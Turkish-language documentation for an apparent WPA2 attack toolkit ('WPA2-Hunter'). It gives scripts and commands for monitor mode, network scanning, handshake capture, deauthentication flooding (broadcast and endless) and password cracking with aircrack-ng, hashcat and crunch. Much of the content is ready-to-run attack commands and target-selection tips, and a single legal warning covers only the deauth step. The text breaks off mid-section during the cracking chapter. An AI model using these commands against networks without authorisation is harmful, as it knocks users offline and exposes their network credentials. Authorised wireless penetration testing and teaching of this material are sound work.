# 📖 WPA2-Hunter Script Dokümantasyonu

Bu belge, WPA2-Hunter projesindeki tüm scriptlerin detaylı açıklamasını içerir.

---

## 📋 İçindekiler

1. [00-cleanup.sh](#00-cleanupsh---sistem-temizliği)
2. [01-setup-monitor-mode.sh](#01-setup-monitor-modesh---monitor-mode-kurulumu)
3. [02-scan-networks.sh](#02-scan-networkssh---ağ-tarama)
4. [03-capture-handshake.sh](#03-capture-handshakesh---handshake-yakalama)
5. [04-deauth-attack.sh](#04-deauth-attacksh---deauthentication-saldırısı)
6. [05-crack-password.sh](#05-crack-passwordsh---parola-kırma)

---

## � Komut Referansı - Tüm Komutların Detaylı Açıklaması

Bu bölümde scriptlerde kullanılan **tüm komutlar** alfabetik sırayla açıklanmıştır.

---

### 📦 Aircrack-ng Suite Komutları

Aircrack-ng, WiFi ağ güvenliği test araçları paketidir.

#### `aircrack-ng` - Parola Kırma Aracı
WPA/WPA2 handshake dosyalarından parola kırmak için kullanılır.

```bash
aircrack-ng [seçenekler] <dosya.cap>
```

| Parametre | Açıklama | Örnek |
|-----------|----------|-------|
| `-w <wordlist>` | Parola listesi dosyası | `-w rockyou.txt` |
| `-b <BSSID>` | Hedef AP'nin MAC adresi | `-b AA:BB:CC:DD:EE:FF` |
| `-e <ESSID>` | Hedef ağ adı | `-e "MyNetwork"` |
| `-l <dosya>` | Bulunan parolayı dosyaya yaz | `-l found.txt` |

**Nasıl Çalışır:**
1. Wordlist'teki her parolayı al
2. PBKDF2-SHA1 ile PMK (Pairwise Master Key) hesapla
3. PMK ile handshake'i doğrula
4. Eşleşirse parola bulunmuştur

**Örnek Kullanım:**
```bash
# Basit kullanım
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# BSSID belirterek
aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# Handshake kontrolü (kırma yapmadan)
aircrack-ng capture-01.cap
```

---

#### `airodump-ng` - Paket Yakalama ve Ağ Tarama Aracı
Havadaki WiFi paketlerini yakalar ve ağları listeler.

```bash
airodump-ng [seçenekler] <interface>
```

| Parametre | Açıklama | Örnek |
|-----------|----------|-------|
| `-c <kanal>` | Belirli kanala odaklan | `-c 6` |
| `--bssid <MAC>` | Belirli AP'ye odaklan | `--bssid AA:BB:CC:DD:EE:FF` |
| `-w <prefix>` | Çıktı dosya adı prefixi | `-w capture` |
| `--output-format` | CSV, PCAP vb. format | `--output-format csv` |
| `--write-interval` | Yazma aralığı (saniye) | `--write-interval 1` |

**Ekran Çıktısı Alanları:**
| Alan | Açıklama |
|------|----------|
| `BSSID` | AP'nin MAC adresi |
| `PWR` | Sinyal gücü (dBm, 0'a yakın = güçlü) |
| `Beacons` | Yakalanan beacon frame sayısı |
| `#Data` | Yakalanan veri paketi sayısı |
| `CH` | Kanal numarası |
| `ENC` | Şifreleme (WPA2, WPA, WEP, OPN) |
| `CIPHER` | Şifre algoritması (CCMP, TKIP) |
| `AUTH` | Kimlik doğrulama (PSK, MGT) |
| `ESSID` | Ağ adı |

**Örnek Kullanım:**
```bash
# Tüm ağları tara
airodump-ng wlan0mon

# Belirli kanala odaklan
airodump-ng -c 6 wlan0mon

# Belirli AP'den handshake yakala
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```

---

#### `aireplay-ng` - Paket Enjeksiyon Aracı
Sahte paketler göndererek saldırı gerçekleştirir.

```bash
aireplay-ng [saldırı_tipi] [seçenekler] <interface>
```

| Saldırı Tipi | Numara | Açıklama |
|--------------|--------|----------|
| `--deauth` | 0 | Deauthentication saldırısı |
| `--fakeauth` | 1 | Sahte kimlik doğrulama |
| `--interactive` | 2 | Etkileşimli paket seçimi |
| `--arpreplay` | 3 | ARP tekrar saldırısı |
| `--chopchop` | 4 | ChopChop saldırısı |
| `--fragment` | 5 | Fragmentation saldırısı |

| Parametre | Açıklama | Örnek |
|-----------|----------|-------|
| `-a <BSSID>` | Access Point MAC | `-a AA:BB:CC:DD:EE:FF` |
| `-c <MAC>` | İstemci MAC | `-c 11:22:33:44:55:66` |
| `-e <ESSID>` | Ağ adı | `-e "TargetNetwork"` |
| `--deauth <sayı>` | Gönderilelecek deauth paketi | `--deauth 10` |

**Deauth Saldırısı Nasıl Çalışır:**
```
┌─────────────┐                           ┌─────────────┐
│  Saldırgan  │                           │  İstemci    │
│  (aireplay) │                           │  (Kurban)   │
└──────┬──────┘                           └──────┬──────┘
       │                                         │
       │  Sahte Deauth Frame                     │
       │  (AP'den geliyormuş gibi)               │
       │────────────────────────────────────────►│
       │                                         │
       │                                   ┌─────┴─────┐
       │                                   │ Bağlantı  │
       │                                   │ Kesiliyor │
       │                                   └─────┬─────┘
       │                                         │
       │                                   ┌─────┴─────┐
       │                                   │ Yeniden   │
       │                                   │ Bağlanma  │
       │                                   │ (4-Way    │
       │                                   │ Handshake)│
       │                                   └───────────┘
```

**Örnek Kullanım:**
```bash
# Tüm istemcilere 5 deauth paketi gönder
aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Belirli istemciye 10 deauth paketi gönder
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Sürekli deauth (0 = sonsuz)
aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

---

#### `airmon-ng` - Monitor Mode Yönetimi
WiFi adaptörünü monitor moduna alır veya çıkarır.

```bash
airmon-ng [komut] [interface]
```

| Komut | Açıklama |
|-------|----------|
| (boş) | Mevcut wireless interface'leri listele |
| `check` | Engelleyici processleri listele |
| `check kill` | Engelleyici processleri durdur |
| `start <iface>` | Monitor mode'u başlat |
| `stop <iface>` | Monitor mode'u durdur |

**Monitor Mode vs Managed Mode:**
| Özellik | Managed Mode | Monitor Mode |
|---------|--------------|--------------|
| Paket alımı | Sadece kendine gelen | Tüm havadaki paketler |
| İnternet | Var | Yok |
| Interface adı | wlan0 | wlan0mon |
| Kullanım | Normal internet | Paket yakalama |

**Örnek Kullanım:**
```bash
# Interface'leri listele
airmon-ng

# Engelleyici süreçleri durdur
airmon-ng check kill

# Monitor mode başlat
airmon-ng start wlan0
# Sonuç: wlan0 → wlan0mon

# Monitor mode durdur
airmon-ng stop wlan0mon
```

---

### 🔨 Hashcat ve Yardımcı Araçlar

#### `hashcat` - GPU Tabanlı Parola Kırma
En hızlı parola kırma aracı, GPU kullanır.

```bash
hashcat [seçenekler] <hash_dosyası> [wordlist]
```

| Parametre | Açıklama | Örnek |
|-----------|----------|-------|
| `-m <mode>` | Hash tipi | `-m 22000` (WPA2) |
| `-a <saldırı>` | Saldırı modu | `-a 0` (dictionary) |
| `-o <dosya>` | Çıktı dosyası | `-o cracked.txt` |
| `--show` | Kırılmış hashleri göster | `--show` |
| `--status` | Durum göster | `--status` |
| `-w <seviye>` | İş yükü profili (1-4) | `-w 3` |

**Hash Modları:**
| Mode | Hash Tipi |
|------|-----------|
| 22000 | WPA-PBKDF2-PMKID+EAPOL (yeni format) |
| 2500 | WPA-EAPOL-PBKDF2 (eski format) |
| 0 | MD5 |
| 100 | SHA1 |
| 1000 | NTLM |

**Saldırı Modları:**
| Mode | Tip | Açıklama |
|------|-----|----------|
| 0 | Dictionary | Wordlist'ten dene |
| 1 | Combination | İki wordlist birleştir |
| 3 | Brute-force | Tüm kombinasyonları dene |
| 6 | Hybrid | Wordlist + mask |
| 7 | Hybrid | Mask + wordlist |

**Örnek Kullanım:**
```bash
# WPA2 hash kırma
hashcat -m 22000 -a 0 handshake.hc22000 rockyou.txt

# Brute force (8 karakter, sadece rakam)
hashcat -m 22000 -a 3 handshake.hc22000 ?d?d?d?d?d?d?d?d

# Kırılmış parolayı göster
hashcat -m 22000 handshake.hc22000 --show
```

---

#### `hcxpcapngtool` - CAP → Hashcat Format Dönüştürücü
Yakalanan .cap dosyasını hashcat formatına dönüştürür.

```bash
hcxpcapngtool [seçenekler] <dosya.cap>
```

| Parametre | Açıklama | Örnek |
|-----------|----------|-------|
| `-o <dosya>` | Çıktı dosyası (.hc22000) | `-o output.hc22000` |
| `-E <dosya>` | ESSID listesi çıkar | `-E essids.txt` |

**Örnek Kullanım:**
```bash
# cap → hc22000 dönüşümü
hcxpcapngtool -o handshake.hc22000 capture-01.cap
```

---

#### `crunch` - Wordlist Oluşturucu
Belirtilen kriterlere göre wordlist oluşturur.

```bash
crunch <min_uzunluk> <max_uzunluk> [karakterler] [seçenekler]
```

| Parametre | Açıklama | Örnek |
|-----------|----------|-------|
| `-o <dosya>` | Çıktı dosyası | `-o wordlist.txt` |
| `-t <pattern>` | Pattern belirt | `-t @@@@1234` |
| `-c <sayı>` | Satır sayısı limiti | `-c 1000000` |

**Özel Karakterler (@, %, ^):**
| Karakter | Anlam |
|----------|-------|
| `@` | Küçük harf (a-z) |
| `,` | Büyük harf (A-Z) |
| `%` | Sayı (0-9) |
| `^` | Özel karakter |

**Örnek Kullanım:**
```bash
# 8 haneli sadece sayılar
crunch 8 8 0123456789 -o numbers.txt

# 6-8 karakter, küçük harf + sayı
crunch 6 8 abcdefghijklmnopqrstuvwxyz0123456789 -o mixed.txt

# Pattern: 4 harf + 4 sayı
crunch 8 8 -t @@@@%%%% -o pattern.txt
```

---

### 🖥️ Linux Sistem Komutları

#### `iwconfig` - Wireless Interface Yapılandırma
Kablosuz ağ arayüzlerini görüntüler ve yapılandırır.

```bash
iwconfig [interface] [parametre değer]
```

**Örnek Çıktı:**
```
wlan0     IEEE 802.11  Mode:Managed  Frequency:2.437 GHz  
          Access Point: AA:BB:CC:DD:EE:FF   
          Bit Rate=54 Mb/s   Tx-Power=20 dBm   
          Link Quality=70/70  Signal level=-40 dBm
```

| Alan | Açıklama |
|------|----------|
| `Mode` | Managed (normal) veya Monitor |
| `Frequency` | Çalışma frekansı |
| `Access Point` | Bağlı olduğu AP |
| `Signal level` | Sinyal gücü (dBm) |

**Örnek Kullanım:**
```bash
# Tüm wireless interface'leri göster
iwconfig

# Belirli interface bilgisi
iwconfig wlan0

# Kanal değiştir (monitor modda)
iwconfig wlan0mon channel 6
```

---

#### `pkill` - Process Sonlandırma
İsme göre process sonlandırır.

```bash
pkill [seçenekler] <pattern>
```

| Parametre | Açıklama |
|-----------|----------|
| `-9` | SIGKILL (zorla sonlandır) |
| `-15` | SIGTERM (nazikçe sonlandır) |
| `-f` | Tam komut satırında ara |
| `-u <user>` | Belirli kullanıcının process'leri |

**Sinyal Türleri:**
| Sinyal | Numara | Davranış |
|--------|--------|----------|
| SIGTERM | 15 | Temiz kapanma iste |
| SIGKILL | 9 | Anında zorla kapat |
| SIGHUP | 1 | Yeniden yükle |

**Örnek Kullanım:**
```bash
# Zorla sonlandır
pkill -9 airodump-ng

# İsme göre sonlandır
pkill -f "airodump-ng wlan0mon"

# Tüm kullanıcının process'leri
pkill -u root airodump-ng
```

---

#### `systemctl` - Servis Yönetimi
Linux sistemd servislerini yönetir.

```bash
systemctl <komut> <servis>
```

| Komut | Açıklama |
|-------|----------|
| `start` | Servisi başlat |
| `stop` | Servisi durdur |
| `restart` | Servisi yeniden başlat |
| `status` | Servis durumu |
| `enable` | Açılışta otomatik başlat |
| `disable` | Açılışta başlatma |

**Örnek Kullanım:**
```bash
# NetworkManager'ı yeniden başlat
systemctl restart NetworkManager

# NetworkManager durumu
systemctl status NetworkManager

# Servisi durdur
systemctl stop wpa_supplicant
```

---

#### `timeout` - Zaman Sınırlı Komut Çalıştırma
Komutu belirtilen süre sonra otomatik durdurur.

```bash
timeout <süre> <komut>
```

| Süre Formatı | Örnek |
|--------------|-------|
| Saniye | `30` |
| Dakika | `5m` |
| Saat | `1h` |

**Örnek Kullanım:**
```bash
# 30 saniye sonra durdur
timeout 30 airodump-ng wlan0mon

# 5 dakika sonra durdur
timeout 5m ping google.com
```

---

### 📂 Dosya ve Metin İşleme Komutları

#### `grep` - Metin Arama
Dosyalarda veya çıktılarda pattern arar.

```bash
grep [seçenekler] <pattern> [dosya]
```

| Parametre | Açıklama |
|-----------|----------|
| `-i` | Büyük/küçük harf duyarsız |
| `-v` | Eşleşmeyenleri göster |
| `-q` | Sessiz mod (sadece exit code) |
| `-r` | Recursive (alt klasörler) |
| `-E` | Extended regex |

**Örnek Kullanım:**
```bash
# WPA2 içeren satırlar
grep -i "WPA2" scan.csv

# "no wireless" içermeyen satırlar
grep -v "no wireless" output.txt

# Sessiz kontrol (if içinde kullanım)
if grep -q "handshake" output.txt; then
    echo "Bulundu!"
fi
```

---

#### `awk` - Metin İşleme
Sütun bazlı metin işleme aracı.

```bash
awk '{print $N}' <dosya>
```

| Değişken | Anlam |
|----------|-------|
| `$0` | Tüm satır |
| `$1, $2...` | 1., 2. sütun |
| `$NF` | Son sütun |
| `NR` | Satır numarası |

**Örnek Kullanım:**
```bash
# 4. sütunu yazdır
awk '{print $4}' output.txt

# 1. ve 3. sütun
awk '{print $1, $3}' file.csv

# : ile ayrılmış 2. alan
awk -F':' '{print $2}' file.txt
```

---

#### `cut` - Metin Kesme
Belirli karakter veya alan aralığını keser.

```bash
cut [seçenekler] <dosya>
```

| Parametre | Açıklama |
|-----------|----------|
| `-d` | Ayırıcı karakter |
| `-f` | Alan numarası |
| `-c` | Karakter pozisyonu |

**Örnek Kullanım:**
```bash
# : ile ayrılmış 2. alan
cut -d':' -f2 file.txt

# 1-10 karakterler
cut -c1-10 file.txt

# , ile ayrılmış 1. ve 3. alan
cut -d',' -f1,3 file.csv
```

---

#### `rm` - Dosya Silme
Dosya ve klasörleri siler.

```bash
rm [seçenekler] <dosya/klasör>
```

| Parametre | Açıklama |
|-----------|----------|
| `-f` | Zorla sil (onay sorma) |
| `-r` | Recursive (klasörle birlikte) |
| `-i` | Her dosya için onay iste |

**Örnek Kullanım:**
```bash
# Tek dosya sil
rm file.txt

# Zorla sil
rm -f /tmp/wpa2hunter_*.conf

# Klasör ve içeriğini sil
rm -rf /tmp/cache/
```

---

#### `cat` - Dosya İçeriği Görüntüleme
Dosya içeriğini ekrana yazar.

```bash
cat [dosya]
```

**Örnek Kullanım:**
```bash
# Dosya içeriğini göster
cat /tmp/wpa2hunter_interface.conf

# Değişkene ata
INTERFACE=$(cat /tmp/config.txt)
```

---

#### `gunzip` - GZIP Sıkıştırma Açma
.gz uzantılı dosyaları açar.

```bash
gunzip <dosya.gz>
```

**Örnek Kullanım:**
```bash
# rockyou.txt.gz → rockyou.txt
gunzip /usr/share/wordlists/rockyou.txt.gz
```

---

#### `wc` - Kelime/Satır Sayma
Dosyadaki satır, kelime, karakter sayısını verir.

```bash
wc [seçenekler] <dosya>
```

| Parametre | Açıklama |
|-----------|----------|
| `-l` | Satır sayısı |
| `-w` | Kelime sayısı |
| `-c` | Byte sayısı |

**Örnek Kullanım:**
```bash
# Satır sayısı
wc -l rockyou.txt
# Çıktı: 14344391 rockyou.txt

# Değişkene ata
COUNT=$(wc -l < wordlist.txt)
```

---

#### `ls` - Dizin Listeleme
Klasör içeriğini listeler.

```bash
ls [seçenekler] [dizin]
```

| Parametre | Açıklama |
|-----------|----------|
| `-l` | Detaylı liste |
| `-h` | İnsan okunabilir boyut |
| `-a` | Gizli dosyalar dahil |

**Örnek Kullanım:**
```bash
# Detaylı liste
ls -lh captures/

# .cap dosyalarını listele
ls -lh captures/*.cap
```

---

#### `mkdir` - Klasör Oluşturma
Yeni klasör oluşturur.

```bash
mkdir [seçenekler] <klasör>
```

| Parametre | Açıklama |
|-----------|----------|
| `-p` | Üst klasörleri de oluştur |

**Örnek Kullanım:**
```bash
# Klasör oluştur
mkdir captures

# Nested klasör oluştur
mkdir -p /path/to/deep/folder
```

---

### 🔀 Bash Script Yapıları

#### `$EUID` - Effective User ID
Scriptin çalıştığı kullanıcının ID'si.

```bash
if [ "$EUID" -ne 0 ]; then
    echo "Root yetkisi gerekli!"
    exit 1
fi
```

| Değer | Kullanıcı |
|-------|-----------|
| 0 | root |
| 1000+ | Normal kullanıcı |

---

#### `set -e` - Hata Durumunda Dur
Herhangi bir komut hata verirse script durur.

```bash
set -e  # Aktifleştir
set +e  # Deaktifleştir
```

---

#### `read` - Kullanıcı Girdisi
Kullanıcıdan input alır.

```bash
read [seçenekler] <değişken>
```

| Parametre | Açıklama |
|-----------|----------|
| `-p "mesaj"` | Prompt mesajı |
| `-s` | Sessiz mod (şifre için) |
| `-t <saniye>` | Timeout |

**Örnek Kullanım:**
```bash
read -p "Interface adı: " INTERFACE
read -s -p "Şifre: " PASSWORD
```

---

#### `2>/dev/null` - Hata Çıktısını Gizle
Stderr'i /dev/null'a yönlendirir.

```bash
komut 2>/dev/null        # Sadece stderr'i gizle
komut >/dev/null 2>&1    # Hem stdout hem stderr'i gizle
komut &>/dev/null        # Kısa yazım (her ikisi)
```

---

#### `|| true` - Hata Durumunda Devam Et
Komut hata verse bile script devam eder.

```bash
pkill -9 process 2>/dev/null || true
```

---

#### `$!` - Son Arka Plan Process ID
Son arka planda başlatılan komutun PID'si.

```bash
airodump-ng wlan0mon &
SCAN_PID=$!
echo "PID: $SCAN_PID"
```

---

#### `kill -0` - Process Var mı Kontrolü
Process'in çalışıp çalışmadığını kontrol eder.

```bash
if kill -0 $PID 2>/dev/null; then
    echo "Process çalışıyor"
else
    echo "Process yok"
fi
```

---

## �🔄 Genel İş Akışı

```
┌──────────────────┐
│ 00-cleanup.sh    │  → Sistemi temizle/sıfırla
└────────┬─────────┘
         ▼
┌──────────────────┐
│ 01-setup-monitor │  → WiFi'ı monitor moduna al
└────────┬─────────┘
         ▼
┌──────────────────┐
│ 02-scan-networks │  → Çevredeki ağları tara
└────────┬─────────┘
         ▼
┌──────────────────┐
│ 03-capture-      │  → Hedef ağdan handshake yakala
│    handshake     │
└────────┬─────────┘
         │
         ├──────────────────────┐
         │                      ▼
         │              ┌──────────────────┐
         │              │ 04-deauth-attack │  → İstemciyi düşür (opsiyonel)
         │              └────────┬─────────┘
         │                       │
         ◄───────────────────────┘
         ▼
┌──────────────────┐
│ 05-crack-        │  → Parola kır
│    password      │
└──────────────────┘
```

---

## 00-cleanup.sh - Sistem Temizliği

**Amaç:** Tüm WPA2-Hunter işlemlerini durdurur ve sistemi sıfırlar.

### Gereksinimler
- Root yetkisi (`sudo`)
- aircrack-ng suite kurulu olmalı

### İşlem Adımları

| Adım | Komut | Açıklama |
|------|-------|----------|
| 1 | `pkill -9 airodump-ng` | Ağ tarama sürecini zorla sonlandır |
| 2 | `pkill -9 aireplay-ng` | Deauth saldırı sürecini sonlandır |
| 3 | `pkill -9 aircrack-ng` | Şifre kırma sürecini sonlandır |
| 4 | `airmon-ng stop wlan0mon` | Monitor mode'u kapat |
| 5 | `systemctl restart NetworkManager` | Ağ servisini yeniden başlat |
| 6 | `rm -f /tmp/wpa2hunter_*` | Geçici dosyaları temizle |

### Kod Parçaları

#### Root Kontrolü
```bash
if [ "$EUID" -ne 0 ]; then
    echo "[!] Bu script root yetkileri gerektirir!"
    exit 1
fi
```
- `$EUID`: Effective User ID (root için 0)
- Root değilse hata verip çıkar

#### Process Sonlandırma
```bash
pkill -9 airodump-ng 2>/dev/null || true
```
- `pkill -9`: SIGKILL sinyali ile zorla sonlandır
- `2>/dev/null`: Hata mesajlarını gizle
- `|| true`: Process yoksa bile devam et

#### Geçici Dosya Temizliği
```bash
rm -f /tmp/wpa2hunter_*.conf    # Konfigürasyon dosyaları
rm -f /tmp/wpa2hunter_scan*.csv # Tarama sonuçları
rm -f /tmp/wpa2hunter_scan*.cap # Yakalama dosyaları
```

### Kullanım
```bash
sudo ./00-cleanup.sh
```

---

## 01-setup-monitor-mode.sh - Monitor Mode Kurulumu

**Amaç:** WiFi adaptörünü normal moddan monitor moduna geçirir.

### Monitor Mode Nedir?
Normal modda WiFi kartı sadece kendisine gönderilen paketleri alır. Monitor modda ise havadaki **tüm** WiFi trafiğini dinleyebilir.

### Gereksinimler
- Root yetkisi
- Uyumlu WiFi adaptörü
- aircrack-ng suite

### İşlem Adımları

| Adım | Komut | Açıklama |
|------|-------|----------|
| 1 | `iwconfig` | Mevcut WiFi interface'lerini listele |
| 2 | Kullanıcı Input | Interface adını sor (örn: wlan0) |
| 3 | `airmon-ng check kill` | Engelleyici servisleri durdur |
| 4 | `airmon-ng start $INTERFACE` | Monitor mode'u aktifleştir |
| 5 | Doğrulama | Mode:Monitor olduğunu kontrol et |
| 6 | Kaydet | Interface adını config'e yaz |

### Kod Parçaları

#### WiFi Interface Tespiti
```bash
iwconfig 2>/dev/null | grep -v "no wireless" | grep "IEEE 802.11"
```
- `iwconfig`: Kablosuz interface'leri gösterir
- `grep "IEEE 802.11"`: Sadece WiFi destekleyenleri filtrele

#### Engelleyici Servisleri Durdurma
```bash
airmon-ng check kill
```
Bu komut şu servisleri durdurur:
- NetworkManager
- wpa_supplicant
- dhclient

#### Monitor Mode Aktifleştirme
```bash
airmon-ng start "$INTERFACE"
```
- `wlan0` → `wlan0mon` olarak yeniden adlandırılır

#### Mode Doğrulama
```bash
MODE=$(iwconfig "$MON_INTERFACE" 2>/dev/null | grep "Mode:" | awk '{print $4}' | cut -d':' -f2)
if [ "$MODE" = "Monitor" ]; then
    echo "✅ Başarılı!"
fi
```

#### Config Kaydetme
```bash
echo "$MON_INTERFACE" > /tmp/wpa2hunter_interface.conf
```
- Sonraki scriptler bu dosyadan interface adını okur

### Kullanım
```bash
sudo ./01-setup-monitor-mode.sh
```

### Çıktı Örneği
```
[*] WiFi interface'leri tespit ediliyor...
wlan0     IEEE 802.11  Mode:Managed

[?] WiFi interface adını girin (örn: wlan0): wlan0
[*] Engelleyici servisler durduruluyor...
[*] Monitor mode etkinleştiriliyor...

✅ Başarılı! Monitor mode aktif
Monitor Interface: wlan0mon
```

---

## 02-scan-networks.sh - Ağ Tarama

**Amaç:** Çevredeki WPA2 şifreli WiFi ağlarını tarar ve hedef belirleme için bilgi toplar.

### Gereksinimler
- Monitor mode aktif (`01-setup-monitor-mode.sh` çalıştırılmış olmalı)
- Root yetkisi

### Toplanan Bilgiler

| Alan | Açıklama |
|------|----------|
| **BSSID** | Access Point'in MAC adresi |
| **ESSID** | Ağ adı (SSID) |
| **Channel** | WiFi kanalı (1-14) |
| **Power** | Sinyal gücü (dBm, 0'a yakın = güçlü) |
| **Encryption** | Şifreleme türü (WPA2/WPA/WEP) |

### İşlem Adımları

| Adım | Açıklama |
|------|----------|
| 1 | Kaydedilmiş monitor interface'i oku |
| 2 | Monitor mode kontrolü yap |
| 3 | 30 saniye boyunca ağ tara |
| 4 | CSV çıktısından WPA2 ağları filtrele |
| 5 | Sonuçları formatla ve göster |
| 6 | Geçici dosyaları temizle |

### Kod Parçaları

#### Kaydedilmiş Interface Okuma
```bash
if [ -f /tmp/wpa2hunter_interface.conf ]; then
    MON_INTERFACE=$(cat /tmp/wpa2hunter_interface.conf)
fi
```

#### Monitor Mode Kontrolü
```bash
if ! iwconfig "$MON_INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
    echo "[!] Hata: $MON_INTERFACE monitor modda değil!"
    exit 1
fi
```

#### Ağ Tarama (Timeout ile)
```bash
timeout 30 airodump-ng "$MON_INTERFACE" -w /tmp/wpa2hunter_scan --output-format csv 2>/dev/null &
SCAN_PID=$!
```
- `timeout 30`: Maksimum 30 saniye çalışır
- `-w`: Çıktı dosya prefixi
- `--output-format csv`: CSV formatında kaydet
- `&`: Arka planda çalıştır

#### Progress Göstergesi
```bash
for i in {1..30}; do
    if ! kill -0 $SCAN_PID 2>/dev/null; then
        break
    fi
    echo -n "."
    sleep 1
done
```

#### WPA2 Filtreleme
```bash
grep -i "WPA2" "${TEMP_FILE}" | while IFS=',' read -r bssid first_seen last_seen channel ...
```
- Sadece WPA2 içeren satırları al
- CSV alanlarını değişkenlere ata

### Kullanım
```bash
sudo ./02-scan-networks.sh
```

### Çıktı Örneği
```
======================================
   Tespit Edilen WPA2 Ağları
======================================

BSSID: AA:BB:CC:DD:EE:FF
ESSID: HedefAg
Channel: 6
Power: -45 dBm
Encryption: WPA2 / CCMP / PSK
---
```

### Hedef Seçim Kriterleri
- **PWR < -70**: Yakın ve güçlü sinyal
- **#Data > 0**: Aktif trafik var
- **ENC: WPA2**: Hedeflediğimiz şifreleme

---

## 03-capture-handshake.sh - Handshake Yakalama

**Amaç:** Hedef ağdan WPA2 4-Way Handshake paketlerini yakalar.

### 4-Way Handshake Nedir?
Bir istemci WiFi ağına bağlandığında, AP ile 4 mesajlık bir anahtar değişimi yapar. Bu handshake yakalanırsa, şifre offline olarak kırılabilir.

```
┌──────────┐                    ┌──────────┐
│  Client  │                    │    AP    │
└────┬─────┘                    └────┬─────┘
     │                               │
     │  1. ANonce                    │
     │◄──────────────────────────────│
     │                               │
     │  2. SNonce + MIC              │
     │──────────────────────────────►│
     │                               │
     │  3. GTK + MIC                 │
     │◄──────────────────────────────│
     │                               │
     │  4. ACK                       │
     │──────────────────────────────►│
     │                               │
```

### Gereksinimler
- Monitor mode aktif
- Hedef ağın BSSID ve kanalı (02-scan'den)
- Hedef ağa bağlı aktif bir istemci

### İşlem Adımları

| Adım | Açıklama |
|------|----------|
| 1 | Monitor interface kontrolü |
| 2 | Hedef BSSID ve kanal bilgisi al |
| 3 | Çıktı dosya adı belirle |
| 4 | Hedef bilgilerini config'e kaydet |
| 5 | airodump-ng ile paket yakalama başlat |
| 6 | Handshake doğrulaması yap |

### Kod Parçaları

#### Hedef Bilgilerini Kaydetme
```bash
echo "$TARGET_BSSID" > /tmp/wpa2hunter_target_bssid.conf
echo "$TARGET_CHANNEL" > /tmp/wpa2hunter_target_channel.conf
```

#### Handshake Yakalama
```bash
airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" -w "$OUTPUT_NAME" "$MON_INTERFACE"
```
- `-c`: Belirli kanala odaklan
- `--bssid`: Belirli AP'ye odaklan
- `-w`: Çıktı dosya adı

#### Handshake Doğrulama
```bash
if aircrack-ng "${OUTPUT_NAME}-01.cap" 2>&1 | grep -q "1 handshake"; then
    echo "✅ BAŞARILI! Handshake yakalandı!"
fi
```

### Kullanım
```bash
sudo ./03-capture-handshake.sh
```

### Handshake Yakalama İpuçları
1. **Aktif İstemci Gerekli**: Hedef ağa bağlı cihaz olmalı
2. **Bağlantı Yenileme**: İstemci yeniden bağlanmalı
3. **Deauth Saldırısı**: İstemciyi düşürüp yeniden bağlanmaya zorla

### Çıktı Dosyaları
```
captures/
├── capture-01.cap     # Ana yakalama dosyası
├── capture-01.csv     # AP ve istemci listesi
├── capture-01.kismet.csv
└── capture-01.kismet.netxml
```

---

## 04-deauth-attack.sh - Deauthentication Saldırısı

**Amaç:** Hedef ağdaki istemcileri geçici olarak düşürerek handshake yakalamayı tetikler.

### Deauth Saldırısı Nasıl Çalışır?

```
┌──────────┐     Deauth Paketleri      ┌──────────┐
│ Saldırgan│ ────────────────────────► │ İstemci  │
└──────────┘  (AP gibi davranır)       └────┬─────┘
                                            │
                                            ▼
                                    ┌──────────────┐
                                    │ Bağlantı     │
                                    │ Kopuyor!     │
                                    └──────┬───────┘
                                           │
                                           ▼
                                    ┌──────────────┐
                                    │ Yeniden      │
                                    │ Bağlanma     │
                                    │ (Handshake!) │
                                    └──────────────┘
```

### ⚠️ Yasal Uyarı
> **Bu saldırı SADECE:**
> - Kendi ağınızda
> - Yazılı izniniz olan ağlarda
> 
> **kullanılmalıdır. İzinsiz kullanım YASA DIŞIDIR!**

### Saldırı Tipleri

| Tip | Açıklama | Komut |
|-----|----------|-------|
| **Hedefli** | Belirli bir istemciyi düşür | `-c CLIENT_MAC` |
| **Broadcast** | Tüm istemcileri düşür | Sadece `-a BSSID` |

### İşlem Adımları

| Adım | Açıklama |
|------|----------|
| 1 | Root ve monitor mode kontrolü |
| 2 | Yasal uyarı onayı al ("EVET" yazılmalı) |
| 3 | Kaydedilmiş hedef BSSID kontrol et |
| 4 | Saldırı tipi seç (hedefli/broadcast) |
| 5 | Deauth paketleri gönder |

### Kod Parçaları

#### Yasal Onay Kontrolü
```bash
read -p "[?] Yasal ve etik sorumluluğu kabul ediyor musunuz? (EVET/hayir): " CONFIRM
if [ "$CONFIRM" != "EVET" ]; then
    echo "[!] İşlem iptal edildi."
    exit 0
fi
```
- Tam olarak "EVET" yazılmalı (küçük harf kabul edilmez)

#### Hedefli Saldırı
```bash
aireplay-ng --deauth 10 -a $TARGET_BSSID -c $CLIENT_MAC "$MON_INTERFACE"
```
- `--deauth 10`: 10 adet deauth paketi gönder
- `-a`: Access Point (AP) MAC adresi
- `-c`: İstemci (Client) MAC adresi

#### Broadcast Saldırı
```bash
aireplay-ng --deauth $DEAUTH_COUNT -a $TARGET_BSSID "$MON_INTERFACE"
```
- `-c` olmadan tüm istemcilere gönderilir

### Kullanım
```bash
# Başka terminal açık, 03-capture-handshake çalışırken:
sudo ./04-deauth-attack.sh
```

### Etkili Kullanım İpuçları
1. **Paralel Çalıştırma**: 03-capture-handshake çalışırken bu scripti çalıştır
2. **Tekrar Dene**: İlk seferde yakalanamazsa tekrarla
3. **Paket Sayısı**: 5-10 paket genellikle yeterli
4. **İstemci MAC**: 02-scan çıktısından STATION sütunu

---

## 05-crack-password.sh - Parola Kırma

**Amaç:** Yakalanan handshake dosyasını kullanarak WPA2 parolasını kırar.

### Kırma Yöntemleri

| Yöntem | Araç | Hız | Açıklama |
|--------|------|-----|----------|
| **Dictionary** | Aircrack-ng | ~1,000 key/s | Wordlist'teki kelimeleri dener |
| **Dictionary** | Hashcat | ~100,000+ key/s | GPU ile hızlandırılmış |
| **Brute Force** | Crunch + Aircrack | Değişken | Tüm kombinasyonları dener |

### İşlem Adımları

```
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
